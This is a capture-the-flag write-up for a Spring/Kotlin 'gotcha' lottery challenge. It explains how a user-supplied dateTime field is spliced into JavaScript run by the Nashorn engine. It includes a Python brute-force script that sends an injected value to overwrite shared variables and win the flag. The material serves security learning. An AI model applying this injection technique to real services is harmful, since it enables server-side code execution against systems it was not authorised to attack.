# G0tcha-G0tcha-doggy

![Untitled](G0tcha-G0tcha-doggy%20d7b50205987b4ad98627bdb01734ca50/Untitled.png)

| framework | Spring + Kotlin |
| --- | --- |
| vulnerability | Code Injection? |

# Description

We can do the gotcha by choosing the numbers.

We have to match the number list and bonus number.

Although the server generates random gotcha numbers, we must manipulate it to produce numbers that correspond to the list provided below.

```kotlin
    val gotChaBaby : List<Long> = listOf(5,20)
    val gotChaHack : List<Long> = listOf(5,5,5)
    val gotChaPark : List<Long> = listOf(6,6,6)
    val gotChaKing : List<Long> = listOf(7,7,7)
    val gotChaTazza : List<Long> = listOf(8,8,8)
    val gotChaMaster : List<Long> = listOf(9,9,9)
```

# Code Analysis

### saveGotcha

```kotlin
fun saveGotcha(userName:String, userNumbers: List<Long>, dateTime: String) : GotchaEntity 
```

When we play the gotcha, the `numbers` we submit, along with the `username` and `timestamp`, are sent to the server, which then calls the `saveGotcha()` method.

```kotlin
val script = Script.Builder()
    .script("for(var tempvariable=0;tempvariable<5;tempvariable++){ bonus_number=Math.floor(secureRandom.nextDouble()*value)+1;java.lang.Thread.sleep(2);}")
    .value(dateTime)
    .tempVariable( variableBuiler() )
    .dynamicVariable(StringBuilder().append(variableBuiler()).append(System.currentTimeMillis()).toString())
    .build()
    println("rouletteB script: ${script.script}")
    scriptEngineService.setSecureRandomSeed(userName)
    scriptEngineService.runJS(script.script.toString())
```

The server generates random numbers and bonus numbers through `JavaScript` code that can be executed using the Nashorn script engine. Interestingly, the `script is dynamically generated` based on the provided `dateTime`.

# Exploit

### Code Injection

```kotlin
for (var i=0;i<5;i++){ 
	java.lang.Thread.sleep(2);
	bonus_number = Math.floor(secureRandom.nextDouble() * <dateTime>) + 1;
}

--------

var end_no=variables.get('end_no');
var start_no=variables.get('start_no');
var tmp=[];

for(var i=start_no; i < end_no; i++){
	tmp.push(Math.floor(secureRandom.nextDouble() * <dateTime>) + 1);
	Java.type('java.lang.Thread').sleep(50);
}

var agent_a_array=JSON.stringify(tmp);
```

The above code snippet is beautify the hardcoded script. *the  -------- distinguishes the logic of rouletteB and rouletteA.

As you can see `<dateTime>` space is dynamically generated and this is the code injection point.

But the hard thing was we can’t provide `dateTime` over 25 length. and the agent_a_array only uses first 3 digits.

### payload

```kotlin
import requests

# url = "http://localhost:8000"
url = "http://35.243.76.165:11008"
json = {"userName":"junan", "userNumbers":[5, 20],"dateTime": "30);tmp=end_no=[5];(1"}

while True:
    r = requests.post(f'{url}/api/gotcha', json=json, proxies={"http":"http://127.0.0.1:8080"}).json()
    result = r.get('result').get('result')
    print(result)
    if (result == True):
        print(r.get('result'))
        break

```

Interestingly, the threads share variables, so we can set end_no and tmp variable in the bonus_number generating thread.

To bypass the length limitation, I used little brute force to get correspond bonus_number 20.

```kotlin
for (var i=0;i<5;i++){ 
	java.lang.Thread.sleep(2);
	bonus_number = Math.floor(secureRandom.nextDouble() * 30);
	tmp=end_no=[5];
	(1) + 1;
}
```

So the payload generates above scripts and we can get the flag.